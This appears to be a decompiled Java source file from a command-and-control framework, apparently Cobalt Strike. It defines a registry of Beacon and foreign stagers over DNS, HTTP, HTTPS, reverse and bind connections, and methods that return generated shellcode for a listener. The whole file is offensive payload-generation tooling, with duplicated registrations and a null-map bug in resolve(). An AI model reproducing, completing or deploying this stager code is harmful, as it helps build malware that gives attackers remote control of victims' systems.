package stagers;

import common.AssertUtils;
import common.CommonUtils;
import common.ScListener;

import java.util.HashMap;
import java.util.Map;

public class Stagers {
    private static Stagers stagers = new Stagers();

    protected Map x86_stagers = new HashMap();

    protected Map x64_stagers = new HashMap();

    public Stagers() {
        add(new BeaconDNSStagerX86(null));
        add(new BeaconHTTPSStagerX64(null));
        add(new BeaconHTTPSStagerX86(null));
        add(new BeaconHTTPStagerX64(null));
        add(new BeaconHTTPStagerX86(null));
        add(new ForeignHTTPSStagerX86(null));
        add(new ForeignHTTPStagerX86(null));
        add(new ForeignHTTPSStagerX86(null));
        add(new ForeignHTTPStagerX86(null));
        add(new ForeignReverseStagerX64(null));
        add(new ForeignReverseStagerX86(null));
    }

    public static byte[] shellcode(ScListener scListener, String string1, String string2) {
        GenericStager genericStager = stagers.resolve(scListener, string1, string2);
        return (genericStager != null) ? genericStager.generate() : new byte[0];
    }

    public static byte[] shellcodeBindTcp(ScListener scListener, int n, String string) {
        // BeaconBindStagerX64 beaconBindStagerX64;
        GenericBindStager beaconBindStagerX64;
        if ("x86".equals(string)) {
            beaconBindStagerX64 = new BeaconBindStagerX86(scListener);
        } else if ("x64".equals(string)) {
            beaconBindStagerX64 = new BeaconBindStagerX64(scListener);
        } else {
            throw new RuntimeException("Invalid arch '" + string + "'");
        }
        return beaconBindStagerX64.generate(n);
    }

    public static byte[] shellcodeBindPipe(ScListener scListener, String string1, String string2) {
        if ("x86".equals(string2))
            return (new BeaconPipeStagerX86(scListener)).generate(string1);
        if ("x64".equals(string2))
            throw new RuntimeException("No x64 option for the bind_pipe stager");
        throw new RuntimeException("Invalid arch '" + string2 + "'");
    }

    public GenericStager resolve(ScListener scListener, String string1, String string2) {
        Map map = null;
        if ("x86".equals(string2)) {
            map = this.x86_stagers;
        } else if ("x64".equals(string2)) {
            map = this.x64_stagers;
        } else {
            map = null;
        }
        if (map.containsKey(string1))
            return ((GenericStager) map.get(string1)).create(scListener);
        CommonUtils.print_error("shellcode for " + scListener.getName() + " is empty. No stager " + string2 + " stager for " + string1);
        return null;
    }

    public void add(GenericStager paramGenericStager) {
        if (!AssertUtils.TestArch(paramGenericStager.arch()))
            CommonUtils.print_info(paramGenericStager.getClass().toString());
        if ("x86".equals(paramGenericStager.arch())) {
            this.x86_stagers.put(paramGenericStager.payload(), paramGenericStager);
        } else if ("x64".equals(paramGenericStager.arch())) {
            this.x64_stagers.put(paramGenericStager.payload(), paramGenericStager);
        }
    }
}
